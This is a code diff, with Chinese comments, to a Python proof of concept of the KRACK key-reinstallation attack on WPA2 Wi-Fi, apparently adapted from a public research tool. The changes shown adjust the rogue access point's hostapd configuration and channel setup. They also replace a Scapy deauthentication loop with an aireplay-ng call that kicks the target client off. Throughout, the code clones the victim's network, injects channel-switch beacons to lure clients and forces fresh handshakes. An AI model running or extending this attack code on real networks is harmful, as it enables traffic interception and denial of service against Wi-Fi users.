@@ -24,6 +24,12 @@ def get_tlv_value(p, typee):
 		el = el.payload
 	return None
 
+# 印出 func.
+def print_rx(level, name, p, color=None, suffix=None):
+	if p[Dot11].type == 1: return
+	if color is None and (p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas)): color="orange"
+	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
+
 # 紀錄網路的 config
 class NetworkConfig():
 	def __init__(self):
@@ -88,12 +94,6 @@ class NetworkConfig():
 		self.rogue_channel = 1 if self.real_channel >= 6 else 11
 	
 	# hostapd.confg寫檔 
-	# wmm_advertised={wmmadvertised}
-	# rsn_ptksa_counters={ptksa_counters}
-	# rsn_gtksa_counters={gtksa_counters}
-	# ptksa_counters = (self.capab & 0b001100) >> 2,
-	# gtksa_counters = (self.capab & 0b110000) >> 4,
-	# wmmadvertised = int(args.group),
 	def write_config(self, iface):
 		TEMPLATE = """
 ctrl_interface=/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
@@ -107,8 +107,11 @@ wpa={wpaver}
 wpa_key_mgmt={akms}
 wpa_pairwise={pairwise}
 rsn_pairwise={pairwise}
+rsn_ptksa_counters={ptksa_counters}
+rsn_gtksa_counters={gtksa_counters}
 
 wmm_enabled={wmmenabled}
+wmm_advertised={wmmadvertised}
 hw_mode=g
 auth_algs=3
 wpa_passphrase={password}"""
@@ -121,6 +124,9 @@ wpa_passphrase={password}"""
 			wpaver = self.wpavers,
 			akms = " ".join([akm2str[idx] for idx in self.akms]),
 			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
+			ptksa_counters = (self.capab & 0b001100) >> 2,
+			gtksa_counters = (self.capab & 0b110000) >> 4,
+			wmmadvertised = int(args.group),
 			wmmenabled = self.wmmenabled,
 			password = str(args.password))
 
@@ -595,21 +601,16 @@ class KRAckAttack():
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
 
-		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
-		# self.sock_real.set_channel(self.netconfig.real_channel)
-
 		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
 		if self.nic_real_clientack: 
 			subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
-			subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
+			subprocess.check_output(["iwconfig", self.nic_real_clientack, "channel", str(self.netconfig.real_channel), "fixed"])
 			subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-
-		hostapd_path =('hostapd ' + os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")) + " -dd" + " -K")
-		# hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")) + " -dd" + " -K")
+		hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")) + " -dd" + " -K")
 		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 		
@@ -625,18 +626,16 @@ class KRAckAttack():
 		# Inject some CSA beacons to push victims to our channel
 		self.send_csa_beacon(numbeacons=4)
 
-		# subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
-
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
-		for i in range(0, 11):
-			dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
-			deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
-			self.sock_real.send(deauth)
-		# subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
+		# for i in range(0, 11):
+		# 	dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
+		# 	deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
+		# 	self.sock_real.send(deauth)
+		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
-		if self.clientmac:
-			self.queue_disas(self.clientmac)
+		# if self.clientmac:
+		# 	self.queue_disas(self.clientmac)
 
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
